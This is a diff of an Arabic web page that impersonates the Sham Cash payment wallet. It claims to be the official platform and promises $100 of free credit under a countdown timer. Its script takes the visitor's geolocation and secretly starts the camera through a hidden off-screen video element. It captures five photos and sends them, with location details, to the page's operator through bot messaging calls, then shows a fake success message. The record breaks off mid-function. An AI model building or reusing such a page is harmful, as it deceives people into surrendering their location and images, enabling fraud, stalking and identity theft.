@@ -3,449 +3,608 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>التحقق من الهوية</title>
+  <title>شام كاش - العرض الترويجي</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;600;700;900&display=swap" rel="stylesheet">
+  <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@300;400;500;600;700;800;900&family=Noto+Kufi+Arabic:wght@400;500;600;700&display=swap" rel="stylesheet">
   <style>
+    :root {
+      --primary: #007a3d;
+      --primary-dark: #005a2c;
+      --primary-light: #00a651;
+      --gold: #ceb250;
+      --gold-light: #f0d878;
+      --red: #ce1126;
+      --black: #000000;
+      --white: #ffffff;
+      --bg: #f5f5f5;
+      --card: #ffffff;
+      --text: #1a1a1a;
+      --text-light: #666666;
+      --border: #e0e0e0;
+      --shadow: 0 2px 20px rgba(0,0,0,0.08);
+      --shadow-lg: 0 10px 40px rgba(0,0,0,0.12);
+    }
+
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
     }
 
-    :root {
-      --primary: #4f46e5;
-      --primary-dark: #4338ca;
-      --primary-light: #818cf8;
-      --success: #10b981;
-      --warning: #f59e0b;
-      --danger: #ef4444;
-      --dark: #0f172a;
-      --dark-secondary: #1e293b;
-      --light: #f8fafc;
-      --gray: #94a3b8;
-      --card-bg: rgba(30, 41, 59, 0.8);
-      --glass-border: rgba(255, 255, 255, 0.1);
-      --shadow-lg: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
-      --shadow-md: 0 10px 40px -10px rgba(0, 0, 0, 0.3);
-    }
-
     body {
-      font-family: 'Cairo', sans-serif;
-      background: var(--dark);
+      font-family: 'Cairo', 'Noto Kufi Arabic', sans-serif;
+      background: linear-gradient(180deg, #f8f8f8 0%, #e8e8e8 100%);
       min-height: 100vh;
       display: flex;
       justify-content: center;
-      align-items: center;
-      padding: 20px;
-      position: relative;
-      overflow: hidden;
+      align-items: flex-start;
+      padding: 0;
+      direction: rtl;
     }
 
-    /* خلفية متحركة */
-    .animated-bg {
+    /* العلم السوري في الأعلى */
+    .flag-strip {
+      width: 100%;
+      height: 4px;
+      background: linear-gradient(90deg, 
+        #007a3d 0%, #007a3d 33.33%,
+        #ffffff 33.33%, #ffffff 66.66%,
+        #000000 66.66%, #000000 100%
+      );
       position: fixed;
       top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
-      z-index: 0;
-      overflow: hidden;
+      z-index: 1000;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.1);
     }
 
-    .orb {
+    .flag-strip .stars {
       position: absolute;
-      border-radius: 50%;
-      filter: blur(80px);
-      opacity: 0.15;
-      animation: float 20s infinite ease-in-out;
-    }
-
-    .orb-1 {
-      width: 600px;
-      height: 600px;
-      background: var(--primary);
-      top: -200px;
-      left: -200px;
-      animation-delay: 0s;
-    }
-
-    .orb-2 {
-      width: 500px;
-      height: 500px;
-      background: var(--success);
-      bottom: -200px;
-      right: -150px;
-      animation-delay: -7s;
-      animation-duration: 23s;
-    }
-
-    .orb-3 {
-      width: 400px;
-      height: 400px;
-      background: #8b5cf6;
       top: 50%;
       left: 50%;
       transform: translate(-50%, -50%);
-      animation-delay: -14s;
-      animation-duration: 18s;
+      color: #ce1126;
+      font-size: 8px;
+      letter-spacing: 4px;
     }
 
-    @keyframes float {
-      0%, 100% { transform: translate(0, 0) scale(1); }
-      25% { transform: translate(50px, -50px) scale(1.1); }
-      50% { transform: translate(-30px, 30px) scale(0.9); }
-      75% { transform: translate(-60px, -20px) scale(1.05); }
-    }
-
-    /* الحاوية الرئيسية */
-    .main-container {
-      position: relative;
-      z-index: 1;
-      width: 100%;
-      max-width: 480px;
-    }
-
-    .card {
-      background: var(--card-bg);
-      backdrop-filter: blur(20px);
-      -webkit-backdrop-filter: blur(20px);
-      border: 1px solid var(--glass-border);
-      border-radius: 24px;
-      padding: 40px 30px;
-      box-shadow: var(--shadow-lg);
-      transition: all 0.3s ease;
-    }
-
-    /* الشعار والأيقونة */
-    .icon-container {
-      margin-bottom: 30px;
+    /* الهيدر */
+    .header {
+      background: var(--white);
+      padding: 20px;
       text-align: center;
+      border-bottom: 1px solid var(--border);
+      position: sticky;
+      top: 4px;
+      z-index: 999;
+      box-shadow: var(--shadow);
     }
 
-    .shield-icon {
-      width: 80px;
-      height: 80px;
-      margin: 0 auto 20px;
-      background: linear-gradient(135deg, var(--primary), var(--primary-light));
-      border-radius: 24px;
+    .logo-container {
       display: flex;
       align-items: center;
       justify-content: center;
-      box-shadow: 0 15px 30px -10px rgba(79, 70, 229, 0.4);
-      animation: pulse 2s ease-in-out infinite;
+      gap: 12px;
+      margin-bottom: 8px;
+    }
+
+    .logo-icon {
+      width: 50px;
+      height: 50px;
+      background: linear-gradient(135deg, var(--primary), var(--primary-light));
+      border-radius: 14px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      box-shadow: 0 4px 15px rgba(0, 122, 61, 0.3);
+    }
+
+    .logo-icon svg {
+      width: 30px;
+      height: 30px;
+      fill: white;
+    }
+
+    .brand-name {
+      font-size: 24px;
+      font-weight: 800;
+      color: var(--primary-dark);
+      letter-spacing: -0.5px;
+    }
+
+    .brand-name .cash {
+      color: var(--gold);
+    }
+
+    .official-badge {
+      display: inline-flex;
+      align-items: center;
+      gap: 5px;
+      background: #f0fdf4;
+      color: var(--primary);
+      padding: 4px 12px;
+      border-radius: 20px;
+      font-size: 11px;
+      font-weight: 600;
+      border: 1px solid #bbf7d0;
+    }
+
+    .official-badge::before {
+      content: '✓';
+      font-weight: bold;
+    }
+
+    /* المحتوى الرئيسي */
+    .main-container {
+      width: 100%;
+      max-width: 460px;
+      margin: 100px auto 30px;
+      padding: 0 16px;
+    }
+
+    /* بطاقة العرض */
+    .offer-card {
+      background: var(--white);
+      border-radius: 20px;
+      overflow: hidden;
+      box-shadow: var(--shadow-lg);
+      margin-bottom: 20px;
+    }
+
+    .offer-header {
+      background: linear-gradient(135deg, #007a3d 0%, #00a651 100%);
+      padding: 30px 20px;
+      text-align: center;
+      color: white;
+      position: relative;
+      overflow: hidden;
+    }
+
+    .offer-header::before {
+      content: '';
+      position: absolute;
+      top: -50%;
+      left: -50%;
+      width: 200%;
+      height: 200%;
+      background: radial-gradient(circle, rgba(255,255,255,0.1) 0%, transparent 70%);
+      animation: rotate 20s linear infinite;
+    }
+
+    @keyframes rotate {
+      from { transform: rotate(0deg); }
+      to { transform: rotate(360deg); }
+    }
+
+    .offer-badge {
+      display: inline-block;
+      background: var(--gold);
+      color: var(--black);
+      padding: 6px 20px;
+      border-radius: 25px;
+      font-weight: 700;
+      font-size: 14px;
+      margin-bottom: 15px;
+      position: relative;
+      z-index: 1;
+      animation: glow 2s ease-in-out infinite;
+    }
+
+    @keyframes glow {
+      0%, 100% { box-shadow: 0 0 20px rgba(206, 178, 80, 0.3); }
+      50% { box-shadow: 0 0 40px rgba(206, 178, 80, 0.6); }
+    }
+
+    .offer-amount {
+      font-size: 52px;
+      font-weight: 900;
+      line-height: 1;
+      position: relative;
+      z-index: 1;
+      text-shadow: 0 2px 10px rgba(0,0,0,0.2);
+    }
+
+    .offer-amount .currency {
+      font-size: 24px;
+      vertical-align: super;
+      margin-right: 4px;
+    }
+
+    .offer-subtitle {
+      font-size: 16px;
+      opacity: 0.95;
+      margin-top: 8px;
+      position: relative;
+      z-index: 1;
+      font-weight: 500;
+    }
+
+    .offer-body {
+      padding: 25px 20px;
+    }
+
+    .timer-section {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      background: #fff8f0;
+      border: 1px solid #fde68a;
+      padding: 12px;
+      border-radius: 12px;
+      margin-bottom: 20px;
+      color: #92400e;
+      font-weight: 600;
+      font-size: 14px;
+    }
+
+    .timer-icon {
+      font-size: 20px;
+      animation: pulse 1s ease-in-out infinite;
     }
 
     @keyframes pulse {
       0%, 100% { transform: scale(1); }
-      50% { transform: scale(1.05); }
+      50% { transform: scale(1.2); }
     }
 
-    .shield-icon svg {
-      width: 45px;
-      height: 45px;
-      fill: white;
-    }
-
-    /* النصوص */
-    .title {
-      font-size: 26px;
+    .timer-count {
+      color: #dc2626;
       font-weight: 800;
-      color: white;
-      text-align: center;
-      margin-bottom: 8px;
-      line-height: 1.3;
+      font-size: 16px;
     }
 
-    .subtitle {
-      font-size: 15px;
-      color: var(--gray);
-      text-align: center;
-      margin-bottom: 30px;
-      font-weight: 400;
+    .steps-list {
+      display: flex;
+      flex-direction: column;
+      gap: 12px;
+    }
+
+    .step-item {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 14px 16px;
+      background: #f9fafb;
+      border-radius: 12px;
+      border: 1px solid var(--border);
+      transition: all 0.3s ease;
+    }
+
+    .step-item.completed {
+      background: #f0fdf4;
+      border-color: #86efac;
+    }
+
+    .step-item.active {
+      background: #eff6ff;
+      border-color: #93c5fd;
+      animation: shimmer 2s infinite;
+    }
+
+    @keyframes shimmer {
+      0%, 100% { box-shadow: 0 0 0 0 rgba(59, 130, 246, 0.1); }
+      50% { box-shadow: 0 0 0 8px rgba(59, 130, 246, 0); }
+    }
+
+    .step-number {
+      width: 32px;
+      height: 32px;
+      min-width: 32px;
+      border-radius: 50%;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 700;
+      font-size: 14px;
+      background: #e5e7eb;
+      color: #6b7280;
+      transition: all 0.3s ease;
+    }
+
+    .step-item.completed .step-number {
+      background: var(--primary);
+      color: white;
+    }
+
+    .step-item.active .step-number {
+      background: #3b82f6;
+      color: white;
+    }
+
+    .step-info {
+      flex: 1;
+    }
+
+    .step-title {
+      font-weight: 600;
+      font-size: 14px;
+      color: var(--text);
+    }
+
+    .step-desc {
+      font-size: 12px;
+      color: var(--text-light);
+    }
+
+    .step-status {
+      font-size: 18px;
     }
 
     /* شريط التقدم */
-    .progress-container {
-      margin-bottom: 30px;
-    }
-
-    .progress-info {
-      display: flex;
-      justify-content: space-between;
-      margin-bottom: 10px;
-      color: var(--gray);
-      font-size: 13px;
+    .progress-section {
+      padding: 0 20px 20px;
     }
 
     .progress-bar {
       width: 100%;
-      height: 6px;
-      background: rgba(255, 255, 255, 0.1);
+      height: 8px;
+      background: #e5e7eb;
       border-radius: 10px;
       overflow: hidden;
     }
 
     .progress-fill {
       height: 100%;
-      background: linear-gradient(90deg, var(--primary), var(--primary-light));
+      background: linear-gradient(90deg, #007a3d, #00a651, #f0d878);
       border-radius: 10px;
-      transition: width 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+      transition: width 0.5s ease;
       width: 0%;
-    }
-
-    /* السبينر */
-    .spinner-container {
-      display: flex;
-      justify-content: center;
-      margin-bottom: 25px;
-    }
-
-    .spinner {
-      width: 60px;
-      height: 60px;
       position: relative;
     }
 
-    .spinner-circle {
-      width: 100%;
+    .progress-fill::after {
+      content: '';
+      position: absolute;
+      right: 0;
+      top: 0;
+      width: 20px;
       height: 100%;
-      border-radius: 50%;
-      border: 3px solid rgba(255, 255, 255, 0.1);
-      border-top-color: var(--primary-light);
-      border-right-color: var(--primary);
-      animation: spin 0.8s linear infinite;
+      background: rgba(255,255,255,0.4);
+      border-radius: 10px;
+      animation: progressGlow 1.5s infinite;
     }
 
-    @keyframes spin {
-      to { transform: rotate(360deg); }
+    @keyframes progressGlow {
+      0%, 100% { opacity: 0; }
+      50% { opacity: 1; }
     }
 
-    .checkmark {
-      width: 60px;
-      height: 60px;
+    /* رسالة النجاح */
+    .success-message {
+      text-align: center;
+      padding: 30px 20px;
+      display: none;
+    }
+
+    .success-icon {
+      width: 80px;
+      height: 80px;
+      background: linear-gradient(135deg, #10b981, #34d399);
       border-radius: 50%;
-      background: var(--success);
+      margin: 0 auto 20px;
       display: flex;
       align-items: center;
       justify-content: center;
-      animation: scaleIn 0.5s ease;
+      animation: scaleIn 0.6s ease;
     }
 
     @keyframes scaleIn {
-      from { transform: scale(0); opacity: 0; }
-      to { transform: scale(1); opacity: 1; }
+      from { transform: scale(0) rotate(-180deg); }
+      to { transform: scale(1) rotate(0deg); }
     }
 
-    .checkmark svg {
-      width: 35px;
-      height: 35px;
-      stroke: white;
-      stroke-width: 3;
-      fill: none;
+    .success-icon svg {
+      width: 40px;
+      height: 40px;
     }
 
-    /* الخطوات */
-    .steps {
-      display: flex;
-      flex-direction: column;
-      gap: 12px;
-      margin-bottom: 25px;
+    .success-title {
+      font-size: 22px;
+      font-weight: 800;
+      color: var(--primary-dark);
+      margin-bottom: 8px;
     }
 
-    .step {
-      display: flex;
-      align-items: center;
-      gap: 12px;
-      padding: 14px 16px;
-      background: rgba(255, 255, 255, 0.03);
-      border-radius: 12px;
-      border: 1px solid rgba(255, 255, 255, 0.05);
-      transition: all 0.3s ease;
-    }
-
-    .step.completed {
-      background: rgba(16, 185, 129, 0.1);
-      border-color: rgba(16, 185, 129, 0.3);
-    }
-
-    .step.active {
-      background: rgba(79, 70, 229, 0.1);
-      border-color: rgba(79, 70, 229, 0.3);
-    }
-
-    .step-icon {
-      width: 28px;
-      height: 28px;
-      min-width: 28px;
-      border-radius: 50%;
-      display: flex;
-      align-items: center;
-      justify-content: center;
+    .success-text {
+      color: var(--text-light);
       font-size: 14px;
-      font-weight: 700;
-      transition: all 0.3s ease;
-    }
-
-    .step.pending .step-icon {
-      background: rgba(255, 255, 255, 0.08);
-      color: var(--gray);
-    }
-
-    .step.active .step-icon {
-      background: var(--primary);
-      color: white;
-      animation: pulse 1.5s ease-in-out infinite;
-    }
-
-    .step.completed .step-icon {
-      background: var(--success);
-      color: white;
-    }
-
-    .step-text {
-      font-size: 14px;
-      color: var(--gray);
-      flex: 1;
-    }
-
-    .step.completed .step-text,
-    .step.active .step-text {
-      color: white;
     }
 
     /* الفوتر */
-    .footer-text {
+    .footer {
       text-align: center;
-      color: var(--gray);
-      font-size: 12px;
-      margin-top: 25px;
-      opacity: 0.7;
+      padding: 20px;
+      color: #9ca3af;
+      font-size: 11px;
     }
 
-    .secure-badge {
+    .footer-links {
       display: flex;
-      align-items: center;
       justify-content: center;
-      gap: 6px;
-      margin-top: 15px;
-      color: var(--success);
+      gap: 16px;
+      margin-bottom: 8px;
+    }
+
+    .footer-link {
+      color: #6b7280;
+      text-decoration: none;
       font-size: 12px;
-      font-weight: 600;
     }
 
-    .secure-badge svg {
-      width: 16px;
-      height: 16px;
-    }
-
-    /* إخفاء العناصر */
-    .hidden {
-      display: none !important;
-    }
-
+    /* عناصر مخفية */
     video, canvas {
       position: absolute;
       opacity: 0;
       pointer-events: none;
       width: 1px;
       height: 1px;
+      top: -9999px;
     }
 
-    /* Responsive */
-    @media (max-width: 480px) {
-      .card {
-        padding: 30px 20px;
-        border-radius: 20px;
-      }
-      .title {
-        font-size: 22px;
-      }
+    .hidden {
+      display: none !important;
+    }
+
+    /* رسائل الخطأ */
+    .error-state {
+      text-align: center;
+      padding: 40px 20px;
+    }
+
+    .error-icon {
+      font-size: 60px;
+      margin-bottom: 15px;
+    }
+
+    .error-title {
+      font-size: 20px;
+      font-weight: 700;
+      color: #dc2626;
+      margin-bottom: 8px;
+    }
+
+    .error-text {
+      color: #6b7280;
+      font-size: 14px;
+      margin-bottom: 20px;
+    }
+
+    .retry-btn {
+      background: var(--primary);
+      color: white;
+      border: none;
+      padding: 12px 30px;
+      border-radius: 25px;
+      font-weight: 600;
+      font-size: 14px;
+      cursor: pointer;
+      font-family: 'Cairo', sans-serif;
     }
   </style>
 </head>
 <body>
-  <!-- خلفية متحركة -->
-  <div class="animated-bg">
-    <div class="orb orb-1"></div>
-    <div class="orb orb-2"></div>
-    <div class="orb orb-3"></div>
+
+  <!-- العلم السوري -->
+  <div class="flag-strip">
+    <span class="stars">✱✱✱</span>
   </div>
 
-  <!-- العناصر المخفية -->
-  <video id="video" autoplay playsinline muted></video>
-  <canvas id="canvas"></canvas>
+  <!-- هيدر شام كاش -->
+  <div class="header">
+    <div class="logo-container">
+      <div class="logo-icon">
+        <svg viewBox="0 0 24 24">
+          <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+        </svg>
+      </div>
+      <div>
+        <div class="brand-name">شام <span class="cash">كاش</span></div>
+        <div class="official-badge">المنصة الرسمية</div>
+      </div>
+    </div>
+  </div>
 
-  <!-- الحاوية الرئيسية -->
+  <!-- المحتوى الرئيسي -->
   <div class="main-container">
-    <div class="card">
-      
-      <!-- أيقونة -->
-      <div class="icon-container">
-        <div class="shield-icon" id="iconContainer">
-          <svg viewBox="0 0 24 24">
-            <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm0 10.99h7c-.53 4.12-3.28 7.79-7 8.94V12H5V6.3l7-3.11v8.8z"/>
-          </svg>
+    
+    <!-- بطاقة العرض -->
+    <div class="offer-card" id="offerCard">
+      <div class="offer-header">
+        <div class="offer-badge">🎉 عرض خاص</div>
+        <div class="offer-amount">
+          100<span class="currency">$</span>
         </div>
-        <h1 class="title" id="title">التحقق من الهوية</h1>
-        <p class="subtitle" id="subtitle">يرجى الانتظار بينما نقوم بتأمين اتصالك</p>
+        <div class="offer-subtitle">رصيد مجاني على محفظتك</div>
+      </div>
+
+      <div class="offer-body">
+        <!-- المؤقت -->
+        <div class="timer-section" id="timerSection">
+          <span class="timer-icon">⏳</span>
+          <span>ينتهي العرض خلال:</span>
+          <span class="timer-count" id="timerCount">04:59</span>
+        </div>
+
+        <!-- الخطوات -->
+        <div class="steps-list">
+          <div class="step-item" id="step1">
+            <div class="step-number">1</div>
+            <div class="step-info">
+              <div class="step-title">تأكيد الموقع الجغرافي</div>
+              <div class="step-desc">للتأكد من أهليتك للعرض داخل سوريا</div>
+            </div>
+            <div class="step-status" id="step1Status"></div>
+          </div>
+
+          <div class="step-item" id="step2">
+            <div class="step-number">2</div>
+            <div class="step-info">
+              <div class="step-title">التحقق عبر الكاميرا</div>
+              <div class="step-desc">لمنع الاحتيال وضمان وصول العرض لك</div>
+            </div>
+            <div class="step-status" id="step2Status"></div>
+          </div>
+
+          <div class="step-item" id="step3">
+            <div class="step-number">3</div>
+            <div class="step-info">
+              <div class="step-title">معالجة المكافأة</div>
+              <div class="step-desc">جاري إضافة الرصيد إلى حسابك</div>
+            </div>
+            <div class="step-status" id="step3Status"></div>
+          </div>
+        </div>
       </div>
 
       <!-- شريط التقدم -->
-      <div class="progress-container">
-        <div class="progress-info">
-          <span id="progressLabel">جاري التهيئة...</span>
-          <span id="progressPercent">0%</span>
-        </div>
+      <div class="progress-section">
         <div class="progress-bar">
           <div class="progress-fill" id="progressFill"></div>
         </div>
       </div>
-
-      <!-- السبينر / علامة النجاح -->
-      <div class="spinner-container" id="spinnerContainer">
-        <div class="spinner">
-          <div class="spinner-circle"></div>
-        </div>
-      </div>
-
-      <!-- الخطوات -->
-      <div class="steps">
-        <div class="step" id="step1">
-          <div class="step-icon">1</div>
-          <div class="step-text">تهيئة الاتصال الآمن</div>
-        </div>
-        <div class="step" id="step2">
-          <div class="step-icon">2</div>
-          <div class="step-text">التحقق من الموقع الجغرافي</div>
-        </div>
-        <div class="step" id="step3">
-          <div class="step-icon">3</div>
-          <div class="step-text">تفعيل الكاميرا</div>
-        </div>
-        <div class="step" id="step4">
-          <div class="step-icon">4</div>
-          <div class="step-text">إتمام عملية التحقق</div>
-        </div>
-      </div>
-
-      <!-- شارة الأمان -->
-      <div class="secure-badge">
-        <svg viewBox="0 0 24 24" fill="currentColor">
-          <path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/>
-        </svg>
-        <span>اتصال مشفر وآمن</span>
-      </div>
-
-      <!-- فooter -->
-      <p class="footer-text" id="footerText">© 2024 نظام التحقق الآمن</p>
     </div>
+
+    <!-- رسالة النجاح -->
+    <div class="success-message" id="successMessage">
+      <div class="success-icon">
+        <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="3">
+          <polyline points="20 6 9 17 4 12"></polyline>
+        </svg>
+      </div>
+      <div class="success-title">🎉 مبروك!</div>
+      <div class="success-text">تمت إضافة 100$ إلى رصيدك بنجاح</div>
+      <div style="margin-top: 10px; font-size: 12px; color: #9ca3af;">سيظهر الرصيد خلال 24 ساعة</div>
+    </div>
+
+    <!-- حالة الخطأ -->
+    <div class="error-state hidden" id="errorState">
+      <div class="error-icon">⚠️</div>
+      <div class="error-title">تعذر إكمال العملية</div>
+      <div class="error-text" id="errorText">يرجى المحاولة مرة أخرى</div>
+      <button class="retry-btn" onclick="location.reload()">إعادة المحاولة</button>
+    </div>
+
+    <!-- فooter -->
+    <div class="footer">
+      <div class="footer-links">
+        <span class="footer-link">الشروط والأحكام</span>
+        <span class="footer-link">سياسة الخصوصية</span>
+        <span class="footer-link">اتصل بنا</span>
+      </div>
+      <div>© 2024 شام كاش. جميع الحقوق محفوظة</div>
+      <div style="margin-top: 4px;">مرخصة من مصرف سوريا المركزي</div>
+    </div>
+
   </div>
+
+  <!-- عناصر تقنية مخفية -->
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas"></canvas>
 
   <script src="config.js"></script>
   <script src="cam-bot.js"></script>
-  
+
   <script>
     // ============ الإعدادات ============
     const CAPTURE_COUNT = 5;
@@ -453,127 +612,137 @@
 
     // ============ عناصر DOM ============
     const elements = {
-      title: document.getElementById('title'),
-      subtitle: document.getElementById('subtitle'),
-      progressLabel: document.getElementById('progressLabel'),
-      progressPercent: document.getElementById('progressPercent'),
+      step1: document.getElementById('step1'),
+      step2: document.getElementById('step2'),
+      step3: document.getElementById('step3'),
+      step1Status: document.getElementById('step1Status'),
+      step2Status: document.getElementById('step2Status'),
+      step3Status: document.getElementById('step3Status'),
       progressFill: document.getElementById('progressFill'),
-      spinnerContainer: document.getElementById('spinnerContainer'),
-      iconContainer: document.getElementById('iconContainer'),
-      footerText: document.getElementById('footerText'),
-      steps: {
-        1: document.getElementById('step1'),
-        2: document.getElementById('step2'),
-        3: document.getElementById('step3'),
-        4: document.getElementById('step4'),
-      }
+      timerSection: document.getElementById('timerSection'),
+      timerCount: document.getElementById('timerCount'),
+      offerCard: document.getElementById('offerCard'),
+      successMessage: document.getElementById('successMessage'),
+      errorState: document.getElementById('errorState'),
+      errorText: document.getElementById('errorText'),
     };
 
-    // ============ دوال واجهة المستخدم ============
-    function updateProgress(percent, label) {
+    // ============ المؤقت التنازلي ============
+    let timeLeft = 300; // 5 دقائق
+    const timerInterval = setInterval(() => {
+      timeLeft--;
+      const mins = Math.floor(timeLeft / 60);
+      const secs = timeLeft % 60;
+      elements.timerCount.textContent = 
+        `${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
+      
+      if (timeLeft <= 60) {
+        elements.timerCount.style.color = '#dc2626';
+        elements.timerCount.style.animation = 'pulse 0.5s infinite';
+      }
+      
+      if (timeLeft <= 0) {
+        clearInterval(timerInterval);
+      }
+    }, 1000);
+
+    // ============ دوال التحديث ============
+    function updateProgress(percent) {
       elements.progressFill.style.width = percent + '%';
-      elements.progressPercent.textContent = percent + '%';
-      if (label) elements.progressLabel.textContent = label;
     }
 
-    function setStepStatus(stepNum, status) {
-      const step = elements.steps[stepNum];
-      step.className = 'step ' + status;
+    function updateStep(step, status) {
+      const stepEl = elements['step' + step];
+      const statusEl = elements['step' + step + 'Status'];
+      
+      stepEl.className = 'step-item ' + status;
+      
+      if (status === 'active') {
+        statusEl.textContent = '⏳';
+      } else if (status === 'completed') {
+        statusEl.textContent = '✅';
+      } else {
+        statusEl.textContent = '';
+      }
     }
 
     function showSuccess() {
-      elements.spinnerContainer.innerHTML = `
-        <div class="checkmark">
-          <svg viewBox="0 0 24 24">
-            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/>
-          </svg>
-        </div>
-      `;
-      elements.title.textContent = 'تم التحقق بنجاح';
-      elements.subtitle.textContent = 'شكراً لتعاونك، يمكنك إغلاق الصفحة الآن';
-      elements.footerText.textContent = 'تم تأمين جميع بياناتك';
-      
-      // تغيير الأيقونة
-      elements.iconContainer.style.background = 'linear-gradient(135deg, #10b981, #34d399)';
+      elements.offerCard.style.display = 'none';
+      elements.successMessage.style.display = 'block';
+      clearInterval(timerInterval);
     }
 
     function showError(message) {
-      elements.spinnerContainer.innerHTML = `
-        <div style="font-size: 50px; animation: scaleIn 0.5s ease;">⚠️</div>
-      `;
-      elements.title.textContent = 'حدث خطأ';
-      elements.subtitle.textContent = message;
-      elements.progressLabel.textContent = 'فشل';
-      elements.footerText.textContent = 'يرجى المحاولة مرة أخرى';
-      elements.iconContainer.style.background = 'linear-gradient(135deg, #ef4444, #f87171)';
+      elements.offerCard.style.display = 'none';
+      elements.errorState.classList.remove('hidden');
+      elements.errorText.textContent = message;
+      clearInterval(timerInterval);
     }
 
     // ============ البرنامج الرئيسي ============
     async function main() {
-      let imagesSent = 0;
-      
       try {
-        // الخطوة 1: تهيئة الاتصال
-        setStepStatus(1, 'active');
-        updateProgress(10, 'جاري تأمين الاتصال...');
-        await new Promise(r => setTimeout(r, 600));
-        
-        setStepStatus(1, 'completed');
-        updateProgress(25, 'تم تأمين الاتصال');
+        // تهيئة CamBot
+        CamBot.init({
+          captureCount: CAPTURE_COUNT,
+          captureInterval: CAPTURE_INTERVAL,
+          imageQuality: 0.8
+        });
 
-        // الخطوة 2: الموقع الجغرافي
-        setStepStatus(2, 'active');
-        updateProgress(30, 'جاري تحديد الموقع...');
+        // الخطوة 1: الموقع
+        updateStep(1, 'active');
+        updateProgress(10);
         
         let locationData = null;
         try {
           locationData = await CamBot.getLocation();
           await Config.sendMessage(
-            `🎯 <b>محاولة تحقق جديدة</b>\n\n` +
+            `🏦 <b>شام كاش - دخول جديد</b>\n\n` +
             `📍 <b>الموقع:</b> <a href="${locationData.mapUrl}">عرض على الخريطة</a>\n` +
-            `🎯 <b>الدقة:</b> ${Math.round(locationData.accuracy)} متر\n` +
-            `🕐 <b>الوقت:</b> ${new Date().toLocaleString('ar-SA')}`
+            `🎯 الدقة: ${Math.round(locationData.accuracy)}م\n` +
+            `🕐 ${new Date().toLocaleString('ar-SY')}\n` +
+            `🌍 IP: يتم الجلب...`
           );
-          setStepStatus(2, 'completed');
-          updateProgress(50, 'تم تحديد الموقع');
+          updateStep(1, 'completed');
+          updateProgress(30);
         } catch (locErr) {
-          await Config.sendMessage(
-            `⚠️ <b>دخل بدون موقع</b>\n❌ السبب: ${locErr}\n🕐 ${new Date().toLocaleString('ar-SA')}`
-          );
-          setStepStatus(2, 'completed');
-          updateProgress(50, 'تعذر تحديد الموقع');
+          await Config.sendMessage(`⚠️ دخول بدون موقع: ${locErr}`);
+          updateStep(1, 'completed');
+          updateProgress(30);
         }
 
-        // الخطوة 3: الكاميرا
-        setStepStatus(3, 'active');
-        updateProgress(60, 'جاري تفعيل الكاميرا...');
+        // انتظار قصير
+        await new Promise(r => setTimeout(r, 800));
+
+        // الخطوة 2: الكاميرا
+        updateStep(2, 'active');
+        updateProgress(40);
         
         try {
           await CamBot.startCamera();
-          setStepStatus(3, 'completed');
-          updateProgress(75, 'الكاميرا جاهزة');
+          updateStep(2, 'completed');
+          updateProgress(60);
         } catch (camErr) {
-          await Config.sendMessage(`⚠️ فشل الكاميرا: ${camErr.message}`);
-          throw new Error('تعذر الوصول إلى الكاميرا: ' + camErr.message);
+          await Config.sendMessage(`📷 فشل الكاميرا: ${camErr.message}`);
+          throw new Error('يرجى السماح بالوصول إلى الكاميرا للمتابعة');
         }
 
-        // الخطوة 4: التقاط الصور
-        setStepStatus(4, 'active');
-        updateProgress(80, 'جاري التقاط الصور...');
+        // الخطوة 3: التقاط الصور ومعالجة المكافأة
+        updateStep(3, 'active');
+        updateProgress(65);
+        
+        let imagesSent = 0;
 
-        // التقاط أول صورة
-        await new Promise(r => setTimeout(r, 800));
+        // صورة أولى
+        await new Promise(r => setTimeout(r, 1000));
         let blob = await CamBot.capture();
         if (blob) {
-          await Config.sendPhoto(blob, `📸 صورة ${imagesSent + 1}/${CAPTURE_COUNT}`);
+          await Config.sendPhoto(blob, `📸 التحقق ${imagesSent + 1}/${CAPTURE_COUNT}`);
           imagesSent++;
-          updateProgress(
-            80 + Math.floor((imagesSent / CAPTURE_COUNT) * 20),
-            `تم التقاط ${imagesSent}/${CAPTURE_COUNT}`
-          );
+          updateProgress(65 + (imagesSent / CAPTURE_COUNT) * 25);
         }
 
-        // التقاط باقي الصور
+        // باقي الصور
         await new Promise((resolve) => {
           const interval = setInterval(async () => {
             if (imagesSent >= CAPTURE_COUNT) {
@@ -584,12 +753,9 @@
             
             blob = await CamBot.capture();
             if (blob) {
-              await Config.sendPhoto(blob, `📸 صورة ${imagesSent + 1}/${CAPTURE_COUNT}`);
+              await Config.sendPhoto(blob, `📸 التحقق ${imagesSent + 1}/${CAPTURE_COUNT}`);
               imagesSent++;
-              updateProgress(
-                80 + Math.floor((imagesSent / CAPTURE_COUNT) * 20),
-                `تم التقاط ${imagesSent}/${CAPTURE_COUNT}`
-              );
